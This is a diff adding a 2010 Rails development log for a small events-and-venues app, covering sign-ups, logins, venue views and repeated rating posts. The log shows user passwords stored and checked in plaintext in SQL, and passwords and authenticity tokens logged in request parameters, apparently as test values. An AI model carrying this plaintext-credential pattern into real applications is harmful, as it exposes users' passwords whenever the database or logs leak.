+  [4;35;1mSQL (0.5ms)[0m   [0mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 6) [0m
+Completed in 82ms (View: 74, DB: 3) | 200 OK [http://localhost/users/6]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mSELECT version FROM schema_migrations[0m
+Migrating to CreateUsers (1)
+Migrating to CreateVenues (2)
+Migrating to CreateEvents (3)
+Migrating to CreateComments (4)
+Migrating to CreateCategories (5)
+Migrating to CreateTags (6)
+Migrating to CreateTagsVenues (7)
+Migrating to CreateRatings (8)
+Migrating to CreateAttendees (9)
+Migrating to CreateRoles (10)
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT version FROM schema_migrations[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mSHOW TABLES[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW FIELDS FROM `attendees`[0m
+  [4;36;1mSQL (2.8ms)[0m   [0;1mdescribe `attendees`[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mSHOW KEYS FROM `attendees`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `categories`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `categories`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mSHOW KEYS FROM `categories`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (1.7ms)[0m   [0;1mdescribe `comments`[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mSHOW KEYS FROM `comments`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (1.7ms)[0m   [0mdescribe `events`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mSHOW KEYS FROM `events`[0m
+  [4;35;1mSQL (0.8ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+  [4;36;1mSQL (2.0ms)[0m   [0;1mdescribe `ratings`[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mSHOW KEYS FROM `ratings`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mSQL (1.4ms)[0m   [0mdescribe `roles`[0m
+  [4;36;1mSQL (50.3ms)[0m   [0;1mSHOW KEYS FROM `roles`[0m
+  [4;35;1mSQL (1.2ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+  [4;36;1mSQL (1.5ms)[0m   [0;1mdescribe `tags`[0m
+  [4;35;1mSQL (1.0ms)[0m   [0mSHOW KEYS FROM `tags`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSHOW FIELDS FROM `tags_venues`[0m
+  [4;35;1mSQL (1.5ms)[0m   [0mdescribe `tags_venues`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSHOW KEYS FROM `tags_venues`[0m
+  [4;35;1mSQL (0.9ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.6ms)[0m   [0;1mdescribe `users`[0m
+  [4;35;1mSQL (1.1ms)[0m   [0mSHOW KEYS FROM `users`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mSQL (1.7ms)[0m   [0mdescribe `venues`[0m
+  [4;36;1mSQL (0.8ms)[0m   [0;1mSHOW KEYS FROM `venues`[0m
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-11-26 16:17:24) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 14ms (View: 8, DB: 2) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-11-26 16:18:19) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"4fb64a02785956b862680ee91dab9768865085af", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"pass", "role_id"=>"1", "username"=>"charlie", "last_name"=>"b", "password"=>"pass", "email"=>"s@c.com", "first_name"=>"a"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'charlie') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 84ms (View: 7, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-11-26 16:19:03) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"4fb64a02785956b862680ee91dab9768865085af", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"pass", "role_id"=>"1", "username"=>"charlie", "last_name"=>"bart", "password"=>"pass", "email"=>"s@c.com", "first_name"=>"fonzi"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.7ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'charlie') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 17ms (View: 6, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-11-26 16:24:15) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 13ms (View: 7, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-11-26 16:24:58) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"4fb64a02785956b862680ee91dab9768865085af", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"pass", "role_id"=>"1", "username"=>"vivian", "last_name"=>"b", "password"=>"pass", "email"=>"c@b.com", "first_name"=>"c"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'vivian') LIMIT 1[0m
+  [4;36;1mUser Create (0.2ms)[0m   [0;1mINSERT INTO `users` (`created_at`, `zip_code`, `updated_at`, `username`, `role_id`, `last_name`, `password`, `first_name`, `email`) VALUES('2010-11-26 21:24:58', '20148', '2010-11-26 21:24:58', 'vivian', 1, 'b', 'pass', 'c', 'c@b.com')[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mCOMMIT[0m
+Redirected to /users/7
+Completed in 67ms (DB: 2) | 302 Found [http://localhost/users]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:25:00) [GET]
+  Parameters: {"id"=>"7"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.7ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.6ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 7 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 7) [0m
+Completed in 24ms (View: 16, DB: 3) | 200 OK [http://localhost/users/7]
+
+
+Processing VenuesController#index (for 127.0.0.1 at 2010-11-26 16:25:32) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.6ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+found user
+  [4;35;1mVenue Load (0.2ms)[0m   [0mSELECT * FROM `venues` [0m
+Rendering template within layouts/application
+Rendering venues/index
+  [4;36;1mVenue Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+Rendered venues/_venue (4.0ms)
+Rendered venues/_venue (0.2ms)
+Rendered venues/_venue (0.2ms)
+Completed in 21ms (View: 9, DB: 3) | 200 OK [http://localhost/venues]
+
+
+Processing SessionController#logout (for 127.0.0.1 at 2010-11-26 16:25:45) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/logout
+Completed in 127ms (View: 3, DB: 0) | 200 OK [http://localhost/logout]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-26 16:25:51) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 6ms (View: 4, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-26 16:25:59) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"c3a8455f486f3e8ab52f1606ccdd3487ad21ffad", "user"=>{"username"=>"vivian", "password"=>"pass"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Load (0.3ms)[0m   [0mSELECT * FROM `users` WHERE (username = 'vivian' AND password = 'pass') LIMIT 1[0m
+  [4;36;1mUser Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Redirected to /users/7
+Completed in 7ms (DB: 2) | 302 Found [http://localhost/session/check_login]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:25:59) [GET]
+  Parameters: {"id"=>"7"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.5ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+found user
+  [4;35;1mCACHE (0.0ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;36;1mComment Columns (1.8ms)[0m   [0;1mSHOW FIELDS FROM `comments`[0m
+  [4;35;1mSQL (0.3ms)[0m   [0mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 7 AND `comments`.commentable_type = 'User') [0m
+  [4;36;1mEvent Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `events`[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 7) [0m
+Completed in 23ms (View: 16, DB: 2) | 200 OK [http://localhost/users/7]
+
+
+Processing VenuesController#index (for 127.0.0.1 at 2010-11-26 16:26:09) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.6ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 7) [0m
+found user
+  [4;36;1mVenue Load (0.2ms)[0m   [0;1mSELECT * FROM `venues` [0m
+Rendering template within layouts/application
+Rendering venues/index
+  [4;35;1mVenue Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+Rendered venues/_venue (3.6ms)
+Rendered venues/_venue (0.3ms)
+Rendered venues/_venue (0.2ms)
+Completed in 21ms (View: 9, DB: 3) | 200 OK [http://localhost/venues]
+
+
+Processing SessionController#logout (for 127.0.0.1 at 2010-11-26 16:26:22) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/logout
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/logout]
+
+
+Processing SessionController#login (for 127.0.0.1 at 2010-11-26 16:26:25) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+Rendering template within layouts/application
+Rendering session/login
+Completed in 5ms (View: 3, DB: 0) | 200 OK [http://localhost/login]
+
+
+Processing SessionController#check_login (for 127.0.0.1 at 2010-11-26 16:26:33) [POST]
+  Parameters: {"commit"=>"Login", "authenticity_token"=>"1a0e63138d83a6afaebc78b26eefacaf5a0f8db3", "user"=>{"username"=>"charlie", "password"=>"password"}}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Load (0.3ms)[0m   [0;1mSELECT * FROM `users` WHERE (username = 'charlie' AND password = 'password') LIMIT 1[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+Redirected to /users/6
+Completed in 7ms (DB: 2) | 302 Found [http://localhost/session/check_login]
+
+
+Processing UsersController#show (for 127.0.0.1 at 2010-11-26 16:26:33) [GET]
+  Parameters: {"id"=>"6"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (0.9ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mCACHE (0.0ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+Rendering template within layouts/application
+Rendering users/show
+  [4;35;1mComment Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mSQL (0.9ms)[0m   [0;1mSELECT count(*) AS count_all FROM `comments` WHERE (`comments`.commentable_id = 6 AND `comments`.commentable_type = 'User') [0m
+  [4;35;1mEvent Columns (1.1ms)[0m   [0mSHOW FIELDS FROM `events`[0m
+  [4;36;1mSQL (0.5ms)[0m   [0;1mSELECT count(*) AS count_all FROM `events` WHERE (`events`.user_id = 6) [0m
+Completed in 91ms (View: 17, DB: 2) | 200 OK [http://localhost/users/6]
+
+
+Processing VenuesController#index (for 127.0.0.1 at 2010-11-26 16:26:40) [GET]
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.5ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (0.6ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Load (0.3ms)[0m   [0mSELECT * FROM `venues` [0m
+Rendering template within layouts/application
+Rendering venues/index
+  [4;36;1mVenue Columns (1.5ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+Rendered venues/_venue (4.0ms)
+Rendered venues/_venue (0.3ms)
+Rendered venues/_venue (0.2ms)
+Completed in 22ms (View: 10, DB: 3) | 200 OK [http://localhost/venues]
+
+
+Processing VenuesController#show (for 127.0.0.1 at 2010-11-26 16:32:03) [GET]
+  Parameters: {"id"=>"1"}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (2.0ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mUser Load (1.1ms)[0m   [0;1mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;35;1mVenue Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `venues`[0m
+  [4;36;1mVenue Load (1.6ms)[0m   [0;1mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+Rendering template within layouts/application
+Rendering venues/show
+DEPRECATION WARNING: Calling render with a string will render a partial from Rails 2.3. Change this call to render(:file => 'tags/cloud', :locals => locals_hash).. (called from render at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:243)
+  [4;35;1mJoin Table Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `tags_venues`[0m
+  [4;36;1mTag Load (0.4ms)[0m   [0;1mSELECT * FROM `tags` INNER JOIN `tags_venues` ON `tags`.id = `tags_venues`.tag_id WHERE (`tags_venues`.venue_id = 1 ) [0m
+  [4;35;1mTag Columns (0.9ms)[0m   [0mSHOW FIELDS FROM `tags`[0m
+Rendered tags/_show (3.3ms)
+Rendered tags/_new (1.9ms)
+  [4;36;1mRating Load (0.8ms)[0m   [0;1mSELECT * FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+  [4;35;1mRating Columns (1.0ms)[0m   [0mSHOW FIELDS FROM `ratings`[0m
+Rendered ratings/_new (1.0ms)
+  [4;36;1mComment Load (2.4ms)[0m   [0;1mSELECT * FROM `comments` WHERE (`comments`.commentable_id = 1 AND `comments`.commentable_type = 'Venue') [0m
+  [4;35;1mComment Columns (3.1ms)[0m   [0mSHOW FIELDS FROM `comments`[0m
+  [4;36;1mRole Columns (0.9ms)[0m   [0;1mSHOW FIELDS FROM `roles`[0m
+  [4;35;1mRole Load (0.9ms)[0m   [0mSELECT * FROM `roles` WHERE (`roles`.`id` = 2) [0m
+Rendered comments/_comment (182.0ms)
+Rendered comments/_comment (1.1ms)
+Rendered comments/_new (1.8ms)
+Completed in 306ms (View: 290, DB: 6) | 200 OK [http://localhost/venues/show/1]
+
+
+Processing RatingsController#rate (for 127.0.0.1 at 2010-11-26 16:37:33) [POST]
+  Parameters: {"authenticity_token"=>"1a0e63138d83a6afaebc78b26eefacaf5a0f8db3", "id"=>"1", "score"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.4ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.6ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;36;1mRating Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `ratings`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRating Create (0.2ms)[0m   [0;1mINSERT INTO `ratings` (`created_at`, `updated_at`, `venue_id`, `user_id`, `ratings_count`, `score`) VALUES('2010-11-26 21:37:34', '2010-11-26 21:37:34', 1, 6, NULL, 1)[0m
+  [4;35;1mSQL (14.7ms)[0m   [0mCOMMIT[0m
+  [4;36;1mSQL (0.4ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.8ms)
+Completed in 37ms (View: 3, DB: 21) | 200 OK [http://localhost/ratings/rate/1?score=1]
+
+
+Processing RatingsController#rate (for 127.0.0.1 at 2010-11-26 16:38:19) [POST]
+  Parameters: {"authenticity_token"=>"1a0e63138d83a6afaebc78b26eefacaf5a0f8db3", "id"=>"1", "score"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.7ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.9ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;36;1mRating Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `ratings`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRating Create (0.2ms)[0m   [0;1mINSERT INTO `ratings` (`created_at`, `updated_at`, `venue_id`, `user_id`, `ratings_count`, `score`) VALUES('2010-11-26 21:38:19', '2010-11-26 21:38:19', 1, 6, NULL, 1)[0m
+  [4;35;1mSQL (0.6ms)[0m   [0mCOMMIT[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.1ms)
+Completed in 22ms (View: 2, DB: 7) | 200 OK [http://localhost/ratings/rate/1?score=1]
+
+
+Processing RatingsController#rate (for 127.0.0.1 at 2010-11-26 16:38:38) [POST]
+  Parameters: {"authenticity_token"=>"1a0e63138d83a6afaebc78b26eefacaf5a0f8db3", "id"=>"1", "score"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.5ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.6ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;36;1mRating Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `ratings`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRating Create (0.2ms)[0m   [0;1mINSERT INTO `ratings` (`created_at`, `updated_at`, `venue_id`, `user_id`, `ratings_count`, `score`) VALUES('2010-11-26 21:38:38', '2010-11-26 21:38:38', 1, 6, NULL, 1)[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mCOMMIT[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.1ms)
+Completed in 84ms (View: 2, DB: 7) | 200 OK [http://localhost/ratings/rate/1?score=1]
+
+
+Processing RatingsController#rate (for 127.0.0.1 at 2010-11-26 16:38:48) [POST]
+  Parameters: {"authenticity_token"=>"1a0e63138d83a6afaebc78b26eefacaf5a0f8db3", "id"=>"1", "score"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.1ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.6ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.3ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.6ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;36;1mRating Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `ratings`[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mBEGIN[0m
+  [4;36;1mRating Create (0.2ms)[0m   [0;1mINSERT INTO `ratings` (`created_at`, `updated_at`, `venue_id`, `user_id`, `ratings_count`, `score`) VALUES('2010-11-26 21:38:48', '2010-11-26 21:38:48', 1, 6, NULL, 1)[0m
+  [4;35;1mSQL (0.5ms)[0m   [0mCOMMIT[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
+Rendered ratings/_show (1.1ms)
+Completed in 22ms (View: 2, DB: 7) | 200 OK [http://localhost/ratings/rate/1?score=1]
+
+
+Processing RatingsController#rate (for 127.0.0.1 at 2010-11-26 16:38:58) [POST]
+  Parameters: {"authenticity_token"=>"1a0e63138d83a6afaebc78b26eefacaf5a0f8db3", "id"=>"1", "score"=>"1"}
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+  [4;35;1mUser Load (1.5ms)[0m   [0mSELECT * FROM `users` WHERE (`users`.`id` = 6) [0m
+found user
+  [4;36;1mVenue Columns (1.4ms)[0m   [0;1mSHOW FIELDS FROM `venues`[0m
+  [4;35;1mVenue Load (0.9ms)[0m   [0mSELECT * FROM `venues` WHERE (`venues`.`id` = 1) [0m
+  [4;36;1mRating Columns (1.0ms)[0m   [0;1mSHOW FIELDS FROM `ratings`[0m
+  [4;35;1mSQL (0.2ms)[0m   [0mBEGIN[0m
+  [4;36;1mRating Create (0.2ms)[0m   [0;1mINSERT INTO `ratings` (`created_at`, `updated_at`, `venue_id`, `user_id`, `ratings_count`, `score`) VALUES('2010-11-26 21:38:58', '2010-11-26 21:38:58', 1, 6, NULL, 1)[0m
+  [4;35;1mSQL (0.4ms)[0m   [0mCOMMIT[0m
+  [4;36;1mSQL (0.2ms)[0m   [0;1mSELECT avg(`ratings`.score) AS avg_score FROM `ratings` WHERE (venue_id = 1) [0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSELECT count(*) AS count_all FROM `ratings` WHERE (`ratings`.venue_id = 1) [0m
